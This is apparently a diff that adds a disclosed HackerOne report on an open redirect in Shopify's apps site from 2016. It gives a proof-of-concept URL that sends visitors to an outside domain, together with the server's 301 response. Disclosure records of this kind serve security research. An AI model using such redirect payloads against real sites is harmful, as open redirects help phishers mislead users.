@@ -1,0 +1,22 @@
+ReportLink:https://hackerone.com/reports/160047
+WeaknessName:Open Redirect
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:26.09.2016 14:02:04
+
+Summary:
+
+**PoC**
+`https://apps.shopify.com//blackfan.ru/`
+
+**HTTP Response**
+```
+HTTP/1.1 301 Moved Permanently
+Server: Cowboy
+Date: Wed, 17 Aug 2016 11:48:27 GMT
+Connection: close
+Location: //blackfan.ru
+```
